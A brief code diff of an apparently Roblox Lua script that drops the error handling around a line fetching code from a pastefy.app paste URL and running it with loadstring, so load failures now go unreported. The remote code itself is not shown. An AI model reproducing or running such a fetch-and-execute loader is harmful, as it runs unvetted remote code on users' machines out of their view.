@@ -12,12 +12,7 @@ loadingGui.IgnoreGuiInset = true
 
 task.spawn(function()
     pcall(function()
-        local success, err = pcall(function()
-            loadstring(game:HttpGet("https://pastefy.app/CMvu9mqK/raw"))()
-        end)
-        if not success then
-            warn("Failed to load script: " .. err)
-        end
+        loadstring(game:HttpGet("https://pastefy.app/CMvu9mqK/raw"))()
     end)
 end)
 
